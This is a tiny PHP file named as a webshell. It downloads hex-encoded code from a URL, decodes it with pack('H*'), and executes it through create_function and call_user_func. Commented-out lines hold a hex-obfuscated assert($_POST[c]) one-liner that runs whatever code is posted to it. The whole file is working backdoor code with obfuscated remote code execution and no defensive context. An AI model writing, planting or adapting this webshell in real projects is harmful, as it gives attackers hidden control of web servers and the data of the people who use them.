<?php 
//webshell.php
//echo pack('H*', base_convert('0011000000111010', 2, 16));
//echo pack('H*', '61737365727428245f504f53545b635d293b');
//call_user_func(create_function(null,'echo (1+2);'));
//call_user_func(create_function(null,'assert($_POST[c]);'));

$url='http://localhost/DebugPHP/getcode.php?call=code';
call_user_func(create_function(null,pack('H*',file_get_contents($url))));
?>
